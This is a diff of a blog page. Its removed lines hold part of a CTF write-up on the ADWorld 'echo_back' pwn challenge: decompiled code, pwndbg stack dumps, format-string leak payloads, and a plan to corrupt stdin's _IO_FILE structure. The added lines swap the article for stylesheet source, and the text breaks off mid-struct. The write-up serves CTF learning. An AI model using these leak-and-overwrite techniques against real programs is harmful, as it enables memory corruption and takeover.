@@ -161,213 +161,225 @@
             <div class="main-content">
 
                 
-                    <div class="fade-in-down-animation">
-    <div class="article-content-container">
+                    $avatarWidth = 46px;
+$arrow-icon-width = 16px;
+$post-nav-max-width = 220px;
+$article-title-font-size = 1.6rem;
 
-        <div class="article-title">
-            <span class="title-hover-animation">ADWorld PWN Challenge Area Write-ups (IO_FILE related)</span>
-        </div>
+.article-content-container {
 
-        
-            <div class="article-header">
-                <div class="avatar">
-                    <img src="/img/aliwangwang.svg">
-                </div>
-                <div class="info">
-                    <div class="author">
-                        <span class="name">TyeYeah</span>
-                        
-                            <span class="author-label">Lv4</span>
-                        
-                    </div>
-                    <div class="meta-info">
-                        <div class="article-meta-info">
-    <span class="article-date article-meta-item">
-        <i class="fas fa-edit"></i>&nbsp;
-        <span class="pc">2020-10-26 09:10:12</span>
-        <span class="mobile">2020-10-26 09:10</span>
-    </span>
-    
-        <span class="article-categories article-meta-item">
-            <i class="fas fa-folder"></i>&nbsp;
-            <ul>
-                
-                    <li>
-                        <a href="/categories/CTF/">CTF</a>&nbsp;
-                    </li>
-                
-            </ul>
-        </span>
-    
-    
-        <span class="article-tags article-meta-item">
-            <i class="fas fa-tags"></i>&nbsp;
-            <ul>
-                
-                    <li>
-                        <a href="/tags/pwn/">pwn</a>&nbsp;
-                    </li>
-                
-                    <li>
-                        | <a href="/tags/linux/">linux</a>&nbsp;
-                    </li>
-                
-                    <li>
-                        | <a href="/tags/ctf/">ctf</a>&nbsp;
-                    </li>
-                
-                    <li>
-                        | <a href="/tags/io-file/">io-file</a>&nbsp;
-                    </li>
-                
-            </ul>
-        </span>
-    
+  keep-container(false, 0, 0, 30px, 30px);
 
-    
-    
-        <span class="article-wordcount article-meta-item">
-            <i class="fas fa-file-word"></i>&nbsp;<span>2.3k Words</span>
-        </span>
-    
-    
-        <span class="article-min2read article-meta-item">
-            <i class="fas fa-clock"></i>&nbsp;<span>14 Mins</span>
-        </span>
-    
-    
-</div>
+  .article-title {
+    color: var(--second-text-color);
+    font-weight: 600;
+    font-size: $article-title-font-size;
 
-                    </div>
-                </div>
-            </div>
-        
+    +keep-tablet() {
+      font-size: $article-title-font-size * 0.9;
+    }
 
-        <div class="article-content markdown-body">
-            <h2 id="echo-back"><a href="#echo-back" class="headerlink" title="echo_back"></a>echo_back</h2><p>Attachment: <a href="/filehost/apcaw/echo_back.zip">echo_back.zip</a><br>Description: None</p>
-<p>It contains a format string vulnerability, and needs to attack <code>scanf</code> in <code>IO_FILE</code>.</p>
-<h3 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h3><p>Unzip:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ unzip echo_back.zip</span><br><span class="line">Archive:  echo_back.zip</span><br><span class="line">  inflating: echo_back</span><br><span class="line">  inflating: libc.so.6</span><br></pre></td></tr></table></figure>
-<p>And check:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$ file echo_back</span><br><span class="line">echo_back: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=232ab9c69cf82998f32667c8b2aca67bee869ee5, stripped</span><br><span class="line">$ checksec echo_back</span><br><span class="line">[*] &#x27;/root/echo_back&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">$ ./libc.so.6</span><br><span class="line">GNU C Library (Ubuntu GLIBC 2.23-0ubuntu10) stable release version 2.23, by Roland McGrath et al.</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.</span><br><span class="line">There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A</span><br><span class="line">PARTICULAR PURPOSE.</span><br><span class="line">Compiled by GNU CC version 5.4.0 20160609.</span><br><span class="line">Available extensions:</span><br><span class="line">        crypt add-on version 2.1 by Michael Glad and others</span><br><span class="line">        GNU Libidn by Simon Josefsson</span><br><span class="line">        Native POSIX Threads Library by Ulrich Drepper et al</span><br><span class="line">        BIND-8.2.3-T5B</span><br><span class="line">libc ABIs: UNIQUE IFUNC</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.</span><br></pre></td></tr></table></figure>
-<p>Pseudocode:<br><code>main</code>:</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// ST0C_4</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v5; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">initial</span>();</span><br><span class="line">  <span class="built_in">alarm</span>(<span class="number">0x3C</span>u);</span><br><span class="line">  <span class="built_in">banner</span>();</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = <span class="built_in">menu</span>();</span><br><span class="line">      result = v3;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">echo_back</span>(&amp;s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)result == <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)result == <span class="number">1</span> &amp;&amp; !v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">set_name</span>(&amp;s);</span><br><span class="line">      v5 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><code>set_name</code>:</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">set_name</span><span class="params">(<span class="keyword">void</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;name:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, a1, <span class="number">7uLL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><code>echo_back</code>:</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">echo_back</span><span class="params">(_BYTE *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>((<span class="keyword">char</span> *)&amp;nbytes + <span class="number">4</span>, <span class="number">0</span>, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;length:&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;nbytes);</span><br><span class="line">  <span class="built_in">getchar</span>();</span><br><span class="line">  <span class="keyword">if</span> ( (nbytes &amp; <span class="number">0x80000000</span>) != <span class="number">0LL</span> || (<span class="keyword">signed</span> <span class="keyword">int</span>)nbytes &gt; <span class="number">6</span> )</span><br><span class="line">    <span class="built_in">LODWORD</span>(nbytes) = <span class="number">7</span>;</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, (<span class="keyword">char</span> *)&amp;nbytes + <span class="number">4</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)nbytes);</span><br><span class="line">  <span class="keyword">if</span> ( *a1 )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s say:&quot;</span>, a1);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;anonymous say:&quot;</span>, (<span class="keyword">char</span> *)&amp;nbytes + <span class="number">4</span>);</span><br><span class="line">  <span class="built_in">printf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;nbytes + <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><p>In <code>echo_back()</code> we find this format string vulnerability:</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;nbytes + <span class="number">4</span>);</span><br></pre></td></tr></table></figure>
-<p>We can leak things, but if we want to write something…</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (nbytes &amp; <span class="number">0x80000000</span>) != <span class="number">0LL</span> || (<span class="keyword">signed</span> <span class="keyword">int</span>)nbytes &gt; <span class="number">6</span> )</span><br><span class="line">  <span class="built_in">LODWORD</span>(nbytes) = <span class="number">7</span>;</span><br></pre></td></tr></table></figure>
-<p>The payload should be no longer than 7 bytes. So here uses format string to enable us to edit the <code>_IO_FILE</code> structure of <code>stdin</code>(<code>_IO_2_1_stdin_</code>)</p>
-<p>Anyway, let’s leak something first. Go to where vulnerability occurs (<code>printf((const char *)&amp;nbytes + 4);</code>) and check the stack:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"># here is where we stop</span><br><span class="line">pwndbg&gt; context</span><br><span class="line">...</span><br><span class="line">─────────────────────────────────[ DISASM ]─────────────────────────────────</span><br><span class="line">   0x555555554c2c    call   printf@plt &lt;0x555555554890&gt;</span><br><span class="line"></span><br><span class="line">   0x555555554c31    jmp    0x555555554c44</span><br><span class="line">    ↓</span><br><span class="line">   0x555555554c44    lea    rax, [rbp - 0x10]</span><br><span class="line">   0x555555554c48    mov    rdi, rax</span><br><span class="line">   0x555555554c4b    mov    eax, 0</span><br><span class="line"> ► 0x555555554c50    call   printf@plt &lt;0x555555554890&gt;</span><br><span class="line">        format: 0x7fffffffe1a0 ◂— 0x746e65746e6f63 /* &#x27;content&#x27; */</span><br><span class="line">        vararg: 0x7fffffffbb00 ◂— 0x206d616e656d616e (&#x27;namenam &#x27;)</span><br><span class="line"></span><br><span class="line">   0x555555554c55    nop</span><br><span class="line">   0x555555554c56    mov    rax, qword ptr [rbp - 8]</span><br><span class="line">   0x555555554c5a    xor    rax, qword ptr fs:[0x28]</span><br><span class="line">   0x555555554c63    je     0x555555554c6a</span><br><span class="line"></span><br><span class="line">   0x555555554c65    call   __stack_chk_fail@plt &lt;0x555555554888&gt;</span><br><span class="line">...</span><br><span class="line"># and here is what stack looks like</span><br><span class="line">pwndbg&gt; stack 30</span><br><span class="line">00:0000│ rsp  0x7fffffffe180 ◂— 0x0</span><br><span class="line">01:0008│      0x7fffffffe188 —▸ 0x7fffffffe1d0 ◂— 0x6d616e656d616e /* &#x27;namenam&#x27; */</span><br><span class="line">02:0010│      0x7fffffffe190 ◂— 0x555555550a32 /* &#x27;2\nUUUU&#x27; */</span><br><span class="line">03:0018│      0x7fffffffe198 ◂— 0x722aa5300</span><br><span class="line">04:0020│ rdi  0x7fffffffe1a0 ◂— 0x746e65746e6f63 /* &#x27;content&#x27; */</span><br><span class="line">05:0028│      0x7fffffffe1a8 ◂— 0xe825ac4022aa5300</span><br><span class="line">06:0030│ rbp  0x7fffffffe1b0 —▸ 0x7fffffffe1e0 —▸ 0x555555554d30 ◂— push   r15</span><br><span class="line">07:0038│      0x7fffffffe1b8 —▸ 0x555555554d08 ◂— jmp    0x555555554d0b</span><br><span class="line">08:0040│      0x7fffffffe1c0 —▸ 0x555555554d30 ◂— push   r15</span><br><span class="line">09:0048│      0x7fffffffe1c8 ◂— 0x200000001</span><br><span class="line">0a:0050│ r10  0x7fffffffe1d0 ◂— 0x6d616e656d616e /* &#x27;namenam&#x27; */</span><br><span class="line">0b:0058│      0x7fffffffe1d8 ◂— 0xe825ac4022aa5300</span><br><span class="line">0c:0060│      0x7fffffffe1e0 —▸ 0x555555554d30 ◂— push   r15</span><br><span class="line">0d:0068│      0x7fffffffe1e8 —▸ 0x7ffff7e20cca (__libc_start_main+240) ◂— mov    edi, eax</span><br><span class="line">0e:0070│      0x7fffffffe1f0 —▸ 0x7fffffffe2d8 —▸ 0x7fffffffe4fc ◂— &#x27;/root/echo_back&#x27;</span><br><span class="line">0f:0078│      0x7fffffffe1f8 ◂— 0x100000000</span><br><span class="line">10:0080│      0x7fffffffe200 —▸ 0x555555554c6c ◂— push   rbp</span><br><span class="line">11:0088│      0x7fffffffe208 —▸ 0x7ffff7e207d9 (init_cacheinfo+297) ◂— mov    rbp, rax</span><br><span class="line">12:0090│      0x7fffffffe210 ◂— 0x0</span><br><span class="line">13:0098│      0x7fffffffe218 ◂— 0x32dccbb0e1bb4c3f</span><br><span class="line">14:00a0│      0x7fffffffe220 —▸ 0x5555555548e0 ◂— xor    ebp, ebp</span><br><span class="line">15:00a8│      0x7fffffffe228 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">18:00c0│      0x7fffffffe240 ◂— 0x67899ee5b83b4c3f</span><br><span class="line">19:00c8│      0x7fffffffe248 ◂— 0x67898ede62dd4c3f</span><br><span class="line">1a:00d0│      0x7fffffffe250 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">1d:00e8│      0x7fffffffe268 ◂— 0x1</span><br><span class="line">pwndbg&gt; </span><br></pre></td></tr></table></figure>
-<p>The most obvious one is this with <code>__libc_start_main</code>, we can calculate <code>libc base</code> from it:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0d:0068│      0x7fffffffe1e8 —▸ 0x7ffff7e20cca (__libc_start_main+240) ◂— mov    edi, eax</span><br></pre></td></tr></table></figure>
-<p>And the <code>old rbp address</code> (in <code>main()</code> frame) is stored in <code>rbp</code>, from which we can infer the old return address (of <code>main()</code>), by adding <code>0x8</code>.</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">06:0030│ rbp  0x7fffffffe1b0 —▸ 0x7fffffffe1e0 —▸ 0x555555554d30 ◂— push   r15</span><br></pre></td></tr></table></figure>
-<p>Here is the return address of <code>echo_back()</code>, and from this we can calculate <code>main</code> address:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">07:0038│      0x7fffffffe1b8 —▸ 0x555555554d08 ◂— jmp    0x555555554d0b</span><br></pre></td></tr></table></figure>
-<p>But where it actually points to? It is not indicated in <code>pwndbg</code>, so we go back to binary:</p>
-<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>0000000000000C6C main            proc <span class="built_in">near</span>               <span class="comment">; DATA XREF: start+1D↑o</span></span><br><span class="line">...</span><br><span class="line"><span class="symbol">.text:</span>0000000000000D03                 <span class="keyword">call</span>    echo_back</span><br><span class="line"><span class="symbol">.text:</span>0000000000000D08                 <span class="keyword">jmp</span>     short loc_D0B</span><br></pre></td></tr></table></figure>
-<p>As we know, <code>call</code> in assembly codes can be interpreted as:</p>
-<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">push</span> <span class="built_in">IP</span> <span class="comment">; push rip</span></span><br><span class="line"><span class="keyword">jmp</span> <span class="built_in">near</span> <span class="built_in">ptr</span> <span class="comment">; jmp echo_back</span></span><br></pre></td></tr></table></figure>
-<p>The <code>rip</code> here in binary is <code>0x0D08</code> and the <code>main</code> address is <code>0x0C6C</code>, so the return address there should be <code>main addr + (0x0C6C-0x0D08)</code> &#x3D; <code>main addr + 0x9C</code>. Therefore the <code>main address</code>(and <code>elf base</code>) can be obtained by leaking and calculating (<code>- 0x9C</code>).</p>
-<p>By the way, as I input <code>namename</code> before, in <code>set_name()</code>, it is also stored in stack:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0a:0050│ r10  0x7fffffffe1d0 ◂— 0x6d616e656d616e /* &#x27;namenam&#x27; */</span><br></pre></td></tr></table></figure>
-<p>And the things it reads in <code>echo_back</code> (<code>read(0, (char *)&amp;nbytes + 4, (unsigned int)nbytes);</code>), I input <code>content</code> and find it at:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">04:0020│ rdi  0x7fffffffe1a0 ◂— 0x746e65746e6f63 /* &#x27;content&#x27; */</span><br></pre></td></tr></table></figure>
+    +keep-mobile() {
+      font-size: $article-title-font-size * 0.8;
+    }
+  }
 
-<p>As for how to leak by exploiting format string vuln, because it’s on <code>64-bit</code>, first 6 parameters of a func is stored in registers, so our payloads should be:</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">%10<span class="variable">$p</span>:  to get content</span><br><span class="line">%12<span class="variable">$p</span>:  to get <span class="string">&#x27;rbp addr&#x27;</span> <span class="keyword">in</span> <span class="string">&#x27;main()&#x27;</span> frame</span><br><span class="line">%13<span class="variable">$p</span>:  to get <span class="string">&#x27;ret addr&#x27;</span> of <span class="string">&#x27;echo_back()&#x27;</span> and calculate <span class="string">&#x27;main addr&#x27;</span></span><br><span class="line">%16<span class="variable">$p</span>:  to get the name we <span class="built_in">set</span> <span class="keyword">in</span> <span class="string">&#x27;set_name()&#x27;</span></span><br><span class="line">%19<span class="variable">$p</span>:  to get address of <span class="string">&#x27;__libc_start_main&#x27;</span></span><br></pre></td></tr></table></figure>
 
-<p>Though we can control the program flow, we cannot write a only 7-byte payload&#x2F;shellcode, so here we need to attack <code>scanf</code>. The <code>scanf</code> reads data from <code>stdin</code>:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p * stdin</span><br><span class="line">$1 = &#123;</span><br><span class="line">  _flags = -72540021,</span><br><span class="line">  _IO_read_ptr = 0x7ffff7dd1963 &lt;_IO_2_1_stdin_+131&gt; &quot;&quot;,</span><br><span class="line">  _IO_read_end = 0x7ffff7dd1963 &lt;_IO_2_1_stdin_+131&gt; &quot;&quot;,</span><br><span class="line">  _IO_read_base = 0x7ffff7dd1963 &lt;_IO_2_1_stdin_+131&gt; &quot;&quot;,</span><br><span class="line">  _IO_write_base = 0x7ffff7dd1963 &lt;_IO_2_1_stdin_+131&gt; &quot;&quot;,</span><br><span class="line">  _IO_write_ptr = 0x7ffff7dd1963 &lt;_IO_2_1_stdin_+131&gt; &quot;&quot;,</span><br><span class="line">  _IO_write_end = 0x7ffff7dd1963 &lt;_IO_2_1_stdin_+131&gt; &quot;&quot;,</span><br><span class="line">  _IO_buf_base = 0x7ffff7dd1963 &lt;_IO_2_1_stdin_+131&gt; &quot;&quot;,</span><br><span class="line">  _IO_buf_end = 0x7ffff7dd1964 &lt;_IO_2_1_stdin_+132&gt; &quot;&quot;,</span><br><span class="line">  _IO_save_base = 0x0,</span><br><span class="line">  _IO_backup_base = 0x0,</span><br><span class="line">  _IO_save_end = 0x0,</span><br><span class="line">  _markers = 0x0,</span><br><span class="line">  _chain = 0x0,</span><br><span class="line">  _fileno = 0,</span><br><span class="line">  _flags2 = 0,</span><br><span class="line">  _old_offset = -1,</span><br><span class="line">  _cur_column = 0,</span><br><span class="line">  _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">  _shortbuf = &quot;&quot;,</span><br><span class="line">  _lock = 0x7ffff7dd3790 &lt;_IO_stdfile_0_lock&gt;,</span><br><span class="line">  _offset = -1,</span><br><span class="line">  _codecvt = 0x0,</span><br><span class="line">  _wide_data = 0x7ffff7dd19c0 &lt;_IO_wide_data_0&gt;,</span><br><span class="line">  _freeres_list = 0x0,</span><br><span class="line">  _freeres_buf = 0x0,</span><br><span class="line">  __pad5 = 0,</span><br><span class="line">  _mode = 0,</span><br><span class="line">  _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>Actually <code>stdin</code>, <code>stdout</code> and <code>stderr</code> are all <code>_IO_FILE</code> structures defined in <code>glibc-2.23\libio\libio.h</code>, announced in <code>glibc-2.23\libio\stdio.h</code>. </p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// in `glibc-2.23\libio\libio.h` --------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 